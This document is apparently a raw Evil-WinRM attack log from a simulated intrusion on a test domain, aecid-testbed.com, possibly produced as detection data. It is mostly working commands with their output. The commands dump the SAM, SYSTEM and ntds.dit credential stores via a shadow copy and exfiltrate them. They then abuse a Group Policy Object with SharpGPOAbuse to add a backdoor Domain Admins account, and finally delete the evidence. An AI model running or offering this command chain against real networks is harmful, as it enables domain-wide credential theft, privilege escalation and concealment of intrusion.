+[?25l[1G[K[?25h[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { reg.exe save HKLM\SYSTEM C:\Users\Public\SYSTEM.hive /y; reg.exe save HKLM\SAM C:\Users\Public\SAM.hive /y; vssadmin CREATE SHADOW /For=C:; $ShadowCopyVolume = (vssadmin list shadows | Select-String "Shadow Copy Volume:" | Select-Object -First 1).ToString().Split(":")[1].Trim(); cmd.exe /c copy $ShadowCopyVolume\Windows\NTDS\ntds.dit c:\Users\Public\ntds.dit; vssadmin delete shadows /All /Quiet }
+[1GThe operation completed successfully.
+
+The operation completed successfully.
+
+vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
+(C) Copyright 2001-2013 Microsoft Corp.
+
+Successfully created shadow copy for 'C:\'
+    Shadow Copy ID: {b1b9a7be-7dd4-4a72-a2cb-36d21fe2fa08}
+    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+        1 file(s) copied.
+vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
+(C) Copyright 2001-2013 Microsoft Corp.
+
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [0m[?25h[45G
+--- 2025-10-10 13:00:00 INFO: ---
+
+Command: Copy-Item -Path C:\Users\Public\SAM.hive -FromSession $Session -Destination C:\Users\Public\; Copy-Item -Path C:\Users\Public\SYSTEM.hive -FromSession $Session -Destination C:\Users\Public; Copy-Item -Path C:\Users\Public\ntds.dit -FromSession $Session -Destination C:\Users\Public;
+
+[?25l[1G[K[?25h[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> Copy-Item -Path C:\Users\Public\SAM.hive -FromSession $Session -Destination C:\Users\Public\; Copy-Item -Path C:\Users\Public\SYSTEM.hive -FromSession $Session -Destination C:\Users\Public; Copy-Item -Path C:\Users\Public\ntds.dit -FromSession $Session -Destination C:\Users\Public;
+[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [0m[?25h[45G
+--- 2025-10-10 13:00:13 INFO: ---
+
+Command: download C:\\Users\\Public\\SAM.hive
+
+[?25l[1G[K[?25h[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> download C:\\Users\\Public\\SAM.hive 
+[1G                                        
+[0;34mInfo: Downloading C:\Users\Public\SAM.hive to SAM.hive[0m
+Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|                                                  
+[0;34mInfo: Download successful![0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [0m[?25h[45G
+--- 2025-10-10 13:01:03 INFO: ---
+
+Command: download C:\\Users\\Public\\SYSTEM.hive
+
+[?25l[1G[K[?25h[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> download C:\\Users\\Public\\SYSTEM.hive
+[1G                                        
+[0;34mInfo: Downloading C:\Users\Public\SYSTEM.hive to SYSTEM.hive[0m
+Progress: 7% : |▒░░░░░░░░░░|          Progress: 15% : |▒░░░░░░░░░|          Progress: 22% : |▓▒░░░░░░░░|          Progress: 29% : |▓▒░░░░░░░░|          Progress: 37% : |▓▓▒░░░░░░░|          Progress: 44% : |▓▓▓▒░░░░░░|          Progress: 51% : |▓▓▓▓▒░░░░░|          Progress: 59% : |▓▓▓▓▒░░░░░|          Progress: 66% : |▓▓▓▓▓▒░░░░|          Progress: 73% : |▓▓▓▓▓▓▒░░░|          Progress: 81% : |▓▓▓▓▓▓▓▒░░|          Progress: 88% : |▓▓▓▓▓▓▓▒░░|          Progress: 95% : |▓▓▓▓▓▓▓▓▒░|          Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|                                                  
+[0;34mInfo: Download successful![0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [0m[?25h[45G
+--- 2025-10-10 13:02:20 INFO: ---
+
+Command: download C:\\Users\\Public\\ntds.dit
+
+[?25l[1G[K[?25h[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> download C:\\Users\\Public\\ntds.dit 
+[1G                                        
+[0;34mInfo: Downloading C:\Users\Public\ntds.dit to ntds.dit[0m
+Progress: 6% : |▒░░░░░░░░░░|          Progress: 12% : |▒░░░░░░░░░|          Progress: 19% : |▒░░░░░░░░░|          Progress: 25% : |▓▒░░░░░░░░|          Progress: 31% : |▓▓▒░░░░░░░|          Progress: 37% : |▓▓▒░░░░░░░|          Progress: 44% : |▓▓▓▒░░░░░░|          Progress: 50% : |▓▓▓▓▒░░░░░|          Progress: 56% : |▓▓▓▓▒░░░░░|          Progress: 62% : |▓▓▓▓▓▒░░░░|          Progress: 69% : |▓▓▓▓▓▒░░░░|          Progress: 75% : |▓▓▓▓▓▓▒░░░|          Progress: 81% : |▓▓▓▓▓▓▓▒░░|          Progress: 87% : |▓▓▓▓▓▓▓▒░░|          Progress: 94% : |▓▓▓▓▓▓▓▓▒░|          Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|          Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|                                                  
+[0;34mInfo: Download successful![0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [0m[?25h[45G
+--- 2025-10-10 13:02:20 INFO: ---
+
+Command: Decrypting ntds.dit offline ...
+Debug: 'Decrypting ntds.dit offline ...'
+--- 2025-10-10 13:02:33 INFO: ---
+
+Command: Copy-Item -Path C:\Users\Public\SharpGPOAbuse.exe -ToSession $Session -Destination C:\Users\Public;
+
+[?25l[1G[K[?25h[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> Copy-Item -Path C:\Users\Public\SharpGPOAbuse.exe -ToSession $Session -Destination C:\Users\Public;
+[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [0m[?25h[45G
+--- 2025-10-10 13:02:35 INFO: ---
+
+Command: tr -dc A-Za-z0-9 </dev/urandom | head -c 10
+ij8CYjL0fy
+--- 2025-10-10 13:02:35 INFO: ---
+
+Command: ij8CYjL0fy
+
+--- 2025-10-10 13:02:47 INFO: ---
+
+Command: Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { Write-Output "New-ADUser -Name ij8CYjL0fy -AccountPassword (ConvertTo-SecureString 'P@ssword' -AsPlainText -Force) -Enabled 1" > C:\Users\Public\adduser.ps1; Write-Output "Add-ADGroupMember -Identity 'Domain Admins' -Members ij8CYjL0fy" >> C:\Users\Public\adduser.ps1; }
+
+[?25l[1G[K[?25h[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { Write-Output "New-ADUser -Name ij8CYjL0fy -AccountPassword (ConvertTo-SecureString 'P@ssword' -AsPlainText -Force) -Enabled 1" > C:\Users\Public\adduser.ps1; Write-Output "Add-ADGroupMember -Identity 'Domain Admins' -Members ij8CYjL0fy" >> C:\Users\Public\adduser.ps1; }
+[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [0m[?25h[45G
+--- 2025-10-10 13:03:02 INFO: ---
+
+Command: Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { New-GPO -Name "ij8CYjL0fy"; New-GPLINK -Name "ij8CYjL0fy" -Target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com'; C:\Users\Public\SharpGPOAbuse.exe --AddComputerTask --GPOName ij8CYjL0fy --Author wsadmin --TaskName "ij8CYjL0fy" --Command 'powershell.exe' --Arguments 'powershell.exe -ep bypass C:\Users\Public\adduser.ps1'; gpupdate /force }
+
+[?25l[1G[K[?25h[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { New-GPO -Name "ij8CYjL0fy"; New-GPLINK -Name "ij8CYjL0fy" -Target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com'; C:\Users\Public\SharpGPOAbuse.exe --AddComputerTask --GPOName ij8CYjL0fy --Author wsadmin --TaskName "ij8CYjL0fy" --Command 'powershell.exe' --Arguments 'powershell.exe -ep bypass C:\Users\Public\adduser.ps1'; gpupdate /force }
+[1G
+
+PSComputerName   : DC1
+RunspaceId       : a4eef212-7fc4-4154-b9c6-fc13d7441321
+Id               : ee52824c-987f-4e2d-9074-5114dd3e0ec5
+DisplayName      : ij8CYjL0fy
+Path             : cn={EE52824C-987F-4E2D-9074-5114DD3E0EC5},cn=policies,cn=system,DC=aecid-testbed,DC=com
+Owner            : AECID-TESTBED\Domain Admins
+DomainName       : aecid-testbed.com
+CreationTime     : 10/10/2025 1:02:49 PM
+ModificationTime : 10/10/2025 1:02:49 PM
+User             : Microsoft.GroupPolicy.UserConfiguration
+Computer         : Microsoft.GroupPolicy.ComputerConfiguration
+GpoStatus        : AllSettingsEnabled
+WmiFilter        :
+Description      :
+
+PSComputerName : DC1
+RunspaceId     : a4eef212-7fc4-4154-b9c6-fc13d7441321
+DisplayName    : ij8CYjL0fy
+GpoId          : ee52824c-987f-4e2d-9074-5114dd3e0ec5
+Enabled        : True
+Enforced       : False
+Order          : 3
+Target         : OU=Domain Controllers,DC=aecid-testbed,DC=com
+GpoDomainName  : aecid-testbed.com
+
+[+] Domain = aecid-testbed.com
+[+] Domain Controller = dc1.aecid-testbed.com
+[+] Distinguished Name = CN=Policies,CN=System,DC=aecid-testbed,DC=com
+[+] GUID of "ij8CYjL0fy" is: {EE52824C-987F-4E2D-9074-5114DD3E0EC5}
+[+] Creating file \\aecid-testbed.com\SysVol\aecid-testbed.com\Policies\{EE52824C-987F-4E2D-9074-5114DD3E0EC5}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
+[+] versionNumber attribute changed successfully
+[+] The version number in GPT.ini was increased successfully.
+[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
+[+] Done!
+
+--- 2025-10-10 13:03:15 INFO: ---
+
+Command: Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { Remove-GPLink -Name "ij8CYjL0fy" -Target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com' -Confirm:0; Remove-GPO -Name "ij8CYjL0fy" -Confirm:0; Remove-Item C:\Users\Public\*.* -Force }
+
+Updating policy...
+
+
+
+Computer Policy update has completed successfully.
+
+User Policy update has completed successfully.
+
+
+
+
+
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [0m[?25h[45G[?25l[1G[K[?25h[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { Remove-GPLink -Name "ij8CYjL0fy" -Target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com' -Confirm:0; Remove-GPO -Name "ij8CYjL0fy" -Confirm:0; Remove-Item C:\Users\Public\*.* -Force }
+[1G
+
+PSComputerName   : DC1
+RunspaceId       : 1de86203-2338-4e1d-a6e7-4ef52dd9588c
+Id               : ee52824c-987f-4e2d-9074-5114dd3e0ec5
+DisplayName      : ij8CYjL0fy
+Path             : cn={EE52824C-987F-4E2D-9074-5114DD3E0EC5},cn=policies,cn=system,DC=aecid-testbed,DC=com
+Owner            : AECID-TESTBED\Domain Admins
+DomainName       : aecid-testbed.com
+CreationTime     : 10/10/2025 1:02:49 PM
+ModificationTime : 10/10/2025 1:02:50 PM
+User             : Microsoft.GroupPolicy.UserConfiguration
+Computer         : Microsoft.GroupPolicy.ComputerConfiguration
+GpoStatus        : AllSettingsEnabled
+WmiFilter        :
+Description      :
+
+
+
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [0m[?25h[45G
+--- 2025-10-10 13:03:27 INFO: ---
+
+Command: Remove-Item C:\Users\Public\*.* -Force
+
+[?25l[1G[K[?25h[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> Remove-Item C:\Users\Public\*.* -Force
+[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [0m[?25h[45G
+--- 2025-10-10 13:03:29 INFO: ---
+
+Command: rm *.hive *.dit
+
